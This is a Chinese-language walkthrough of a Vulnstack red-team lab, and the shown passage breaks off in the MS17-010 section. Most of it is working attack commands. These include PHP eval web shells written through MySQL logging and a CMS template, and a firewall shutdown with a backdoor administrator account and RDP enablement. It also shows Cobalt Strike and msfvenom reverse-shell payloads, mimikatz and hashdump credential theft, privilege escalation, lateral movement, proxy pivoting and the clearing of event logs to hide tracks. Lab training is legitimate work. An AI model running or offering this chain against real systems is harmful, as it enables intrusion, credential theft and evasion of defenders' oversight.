> 靶场地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
>
> 开机密码：hongrisec@2019
>
> 进入环境后要先改系统密码

# 网络拓扑

![image-20231116210021237](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116210021237.png)

# 环境搭建

先将 server2003 和 server2008 两台主机都设置为自定义`VMnet1`

`VMnet1`仅主机模式的子网地址改为`192.168.52.0`

![image-20231116205828798](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116205828798.png)

![image-20231116205910294](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116205910294.png)

Win7添加一块网卡，一块是`NAT模式`，另一块是`VMnet1仅主机模式`

![image-20231116210210767](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116210210767.png)

**IP地址：**

```
win7:  192.168.52.128           10.9.75.6
2008:  192.168.52.138
2003:  192.168.52.141
```

![image-20231116211457145](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116211457145.png)

启动Win7的Web服务

![image-20231116214619121](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116214619121.png)

![image-20231116214630456](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116214630456.png)

# 外网渗透

## 信息收集

### 端口扫描

```
nmap --min-rate 1000 10.9.75.6
```

![image-20231116220159122](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116220159122.png)

```bash
sudo nmap -sT -sV  -sC -O -p 80,3306 10.9.75.6
```

![image-20231116220453013](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116220453013.png)

```bash
sudo nmap --script=vuln -p 3306,80 10.9.75.6
```



![image-20231116220724223](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116220724223.png)

### 目录扫描

御剑后台扫描工具

![image-20231116224108915](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116224108915.png)

访问80端口

![image-20231116222449223](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116222449223.png)

知道了网站的绝对路径`C:/phpStudy/WWW`

![image-20231116220914234](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116220914234.png)



存在`root:root`弱口令

![image-20231116220938300](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116220938300.png)

访问`phpMyAdmin`

![image-20231116221034913](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116221034913.png)

## 漏洞利用

### phpmyadmin拿shell

#### general_log_file写一句话

尝试能不能通过这个数据库管理页面写一句话，拿WebShell

```sql
SHOW GLOBAL VARIABLES LIKE "%secure%"
```

![image-20231116221316417](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116221316417.png)

说明不能通过`into outfile`来写一句话



查看`general_log`是否开启

```
show global variables like "%general%"
```

![image-20231116221541129](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116221541129.png)

开启`general_log`

```sql
set global general_log="on";
```

再次查询,此时日志功能就开启了

![image-20231116221634860](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116221634860.png)

可以通过`general_log_file`指定为一个`php`后缀的文件，来写查询语句

```sql
set global general_log_file="C:\\phpstudy\\www\\shell.php";
```

```sql
select "<?php  @eval($_REQUEST[6868])?>";
```

![image-20231116221953362](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116221953362.png)

#### 蚁剑连接

![image-20231116222258539](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116222258539.png)

进入文件管理，发现一个`beifen.rar`备份文件

![image-20231116224229009](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116224229009.png)

下载到kali本地，然后解压

```bash
rar x beifen.rar
```

> **rar**
>
> 解压：rar x FileName.rar
>
> 压缩：rar e FileName.rar

![image-20231116224554249](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116224554249.png)

### 网站后台拿shell

http://10.9.75.6/yxcms/

![image-20231116225127725](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116225127725.png)

http://10.9.75.6/yxcms/index.php?r=admin

登陆网站后台

![image-20231116225248366](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116225248366.png)



新建前台模板，写一句话

![image-20231116225432087](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116225432087.png)

![image-20231116225452192](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116225452192.png)



```
<?php @eval($_POST['cmd'])?>; 
```

![image-20231116230608453](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116230608453.png)

在拿到的备份文件中，找到模板的上传点

![image-20231116225907521](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116225907521.png)

http://10.9.75.6/yxcms/protected/apps/default/view/default/

![image-20231116230055297](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116230055297.png)

访问webshell.php

http://10.9.75.6/yxcms/protected/apps/default/view/default/webshell.php

![image-20231116230524622](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231116230524622.png)

### 关闭防火墙

```bash
netsh advfirewall show allprofile state     （显示防火墙）

netsh advfirewall set allprofiles state off （关闭防火墙）
```

![image-20231117132031804](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117132031804.png)

### 新建用户，开启3389

```bash
net user saury 123.com /add # 添加账户密码
net localgroup administrators saury /add  # 添加为管理员权限
```



![image-20231117132145236](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117132145236.png)

```bash
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 
# 开启3389端口
```

如果防火墙没关,rdp会登录失败

![image-20231117132242981](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117132242981.png)

# 内网渗透

## （一）CS

### CS木马上线

kali既充当CS服务端，也充当CS客户端

**启动服务端**

![image-20231117133052571](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117133052571.png)

**客户端连接**

![image-20231117133157944](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117133157944.png)

**开启监听**

![image-20231117133251390](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117133251390.png)

**生成木马**

![image-20231117133321801](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117133321801.png)

![image-20231117133342718](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117133342718.png)

点击`Generate`生成木马`artifact_x64.exe`，保存到 一个位置

**木马上线**

![image-20231117133551853](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117133551853.png)

![image-20231117133704737](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117133704737.png)

执行完木马文件后，CS木马就上线了

![image-20231117133734929](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117133734929.png)

目标上线之后，我们第一步首先要做的就是先将睡眠时间设置为0

![image-20231117134908657](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117134908657.png)

在会话交互框中输入命令：`sleep 0`，将睡眠时间设置为0

![image-20231117135003535](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117135003535.png)

在会话交互框中输入shell whoami可以瞬间得到如下所示的回显，说明睡眠时间设置为0完成

![image-20231117135042657](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117135042657.png)

### 信息收集

一些CS内网信息收集的命令

```bash
shell whoami                //显示administrator权限
shell systeminfo            //查看系统信息
shell ipconfig /all         //查看是否存在域

shell net time /domain          //获取当前域控制器的时间 输入该命令可能存在如下三种情况：存在域，当前用户不是域用户；存在域，当前用户是域用户；不存在域。

shell net view /domain      //查看所有域

shell nbtbios               //快速探测内网

shell net group "domain computers" /domain  //查看域控制器主机名

shell nltest /domain_trusts //查看域信任关系

shell net accounts /domain  //查看域内账号密码信息

shell nltest /dclist:hacker //查看当前域的域控制器
shell net group "Domain Controllers" /domain        //获取域控制器列表
shell net group "Domain Admins" /domain             //获取域管理员列表
shell Tasklist /v            //列出进程和进程用户

```



```
shell systeminfo   
```

![image-20231117142524768](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117142524768.png)



![image-20231117142818741](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117142818741.png)

查看域中的机器

![image-20231117142928435](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117142928435.png)

#### hashdump

![image-20231117143044466](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117143044466.png)



![image-20231117143026831](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117143026831.png)

#### Mimikatz抓取明文密码

![image-20231117143107613](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117143107613.png)

或者直接输入命令也可以执行`logonpasswords`

![image-20231117143230272](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117143230272.png)

### 权限提升

利用`ms15-051`

![image-20231117143914090](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117143914090.png)

![image-20231117143946074](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117143946074.png)

将win7提成SYSTEM权限

### 横向移动

通过 Win7 跳板机，横向渗透拿下内网域内的域成员主机和域控主机

新建一个SMB监听器

> SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用` psexec` 或` Stageless Payload `上线

![image-20231117144046566](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117144046566.png)

![image-20231117144320333](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117144320333.png)

拿下域控 主机

![image-20231117144353531](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117144353531.png)

看到` ∞∞ `这个字符 ，这就是派生的SMB Beacon

查看其IP地址

![image-20231117144708264](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117144708264.png)

再次通过拿下的域控拿下其他域成员机

![image-20231117144435804](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117144435804.png)

![image-20231117144514033](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117144514033.png)

![image-20231117144522649](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117144522649.png)

![image-20231117144739019](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117144739019.png)

横向成功！！！

### CS痕迹清楚

根据入侵的路径依次删除上传的工具、删除Web日志、FTP日志等。

清除安全日志

```
shell wevtutil cl Security
```

清除系统日志，

```
shell wevtutil cl System
```

清除应用日志

```
shell wevtutil cl Application
```

清除启动日志

```
shell wevtutil cl Setup
```

清除RDP登录日志

```bash
shell wevtutil epl Security C:\Windows\System32\winevt\Logs\Security_new.evtx /q:"*[EventData[(Data[@Name='IpAddress']!='127.0.0.1')]]" /ow:true 
```

删除防火墙日志

```
shell del C:\Windows\System32\LogFiles\Firewall\pfirewall.log
```



删除PowerShell执行历史记录

```bash
shell del 
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```



## （二）MSF

### msf木马上线

制作msf木马

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your-IP LPORT=your-PORT -f exe -o /home/kali/tmp/shell.exe
```

![image-20231117152202589](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117152202589.png)

开启msf监听

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.9.75.3
set lport 4567
run
```

通过蚁剑将生成的木马上传并运行

![image-20231117152740528](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117152740528.png)

木马成功上线，进行system提权

![image-20231117152837225](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117152837225.png)



### 信息收集

首先获取目标主机的shell

![image-20231117152945711](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117152945711.png)

出现乱码，可以使用`chcp 65001`解决乱码问题



**查看路由表**

```bash
route print
```

![image-20231117153317504](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117153317504.png)

可以看出内网网段是`192.168.52.0/24`

**查看系统信息**

```bash
systeminfo
```

![image-20231117154912163](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117154912163.png)

![image-20231117154958667](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117154958667.png)

**查看是否在域内**

```bash
ipconfig /all
```

![image-20231117153434469](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117153434469.png)

```bash
net view /domain  #查询当前主机是否加入域，如果加入则列出域名
```

![image-20231117153639092](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117153639092.png)

```bash
net view //查看域内主机
```

![image-20231117154648700](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117154648700.png)

![image-20231117155112423](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117155112423.png)

得到域内其他主机地址

- OWA：**192.168.52.138**
- ROOT-TVI862UBEH：**192.168.52.141**

**查看域内用户**

```bash
net user /domain
```

**获取主机用户密码哈希**

```bash
hashdump
```



![image-20231117155419379](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117155419379.png)

> 用户哈希数据的输出格式为：
>
> ```shell
> 用户名:SID:LM哈希:NTLM哈希:::
> ```

![image-20231117160104658](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117160104658.png)

这是因为当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，需要修改注册表等用户重新登录后才能成功抓取。

[MSF使用_MSF中kiwi(mimikatz)模块的使用](http://t.csdnimg.cn/BVX4w)

尝试抓取域内的账号密码：利用 msf 的 kiwi 模块

```bash
load kiwi #加载kiwi模块
help kiwi #查看kiwi模块的使用
```

注意执行需要system权限

```bash
creds_all         #列举所有凭据
creds_kerberos    #列举域内账号密码
```

### 横向移动

为了让 msf 能访问内网的其他主机，即 52 网段的攻击流量都通过已渗透的这台目标主机（Windows7）的meterpreter会话来传递，需要建立socks反向代理。

> 注：添加路由一定要在挂代理之前，因为代理需要用到路由功能

#### 添加路由、挂上Socks4a代理

使用 msf+proxychains 搭建socks4a隧道，**设置内网路由**

```
run autoroute -s 192.168.52.0/24  # 添加内网的路由
run autoroute -p  # 查看路由
```

![image-20231117162817587](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117162817587.png)

暂时把会话挂起来`background`

```
use auxiliary/server/socks_proxy    //使用socks代理

set SRVHOST 10.9.75.3        //MSF本机的IP地址

set VERSION 4a                      //设置socks代理的版本

exploit            //开始代理
```

![image-20231117163312002](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117163312002.png)

然后在 proxychains 的配置文件` /etc/proxychains4.conf`，添加Kali本机的1080端口：

```bash
sudo vim /etc/proxychains4.conf 
```



![image-20231117163513812](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117163513812.png)

![image-20231117163500181](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117163500181.png)

然后执行命令时，前面加上 proxychains 即可

![image-20231117163748098](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117163748098.png)

#### nmap漏洞扫描

```bash
proxychains nmap --script=vuln 192.168.52.141
```

![image-20231117171504026](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117171504026.png)

#### ms17-010命令执行

知道了目标主机中存在一些漏洞：MS08-067、MS17-010等等，我们就可以用MS17-010的EXP来拿下目标主机，MS17-010的EXP打不了，它这个漏洞有很多莫名其妙的问题，很多其它的因素会导致各种各样的问题出现，打不了并不代表这个漏洞利用不了，有别的玩法，同样也是用MS17-010，MS17-010这个漏洞不光是可以用来拿权限，我们还可以用它来干其它的操作，比如说我们可以用这个漏洞来添加一个账户，因此我们需要用到对应的一个模块，在kali的具有MSF的那个终端中输入命令：这个模块可以在MSF中输入search ms17-010来搜索到，输入完命令之后，会出现很多模块

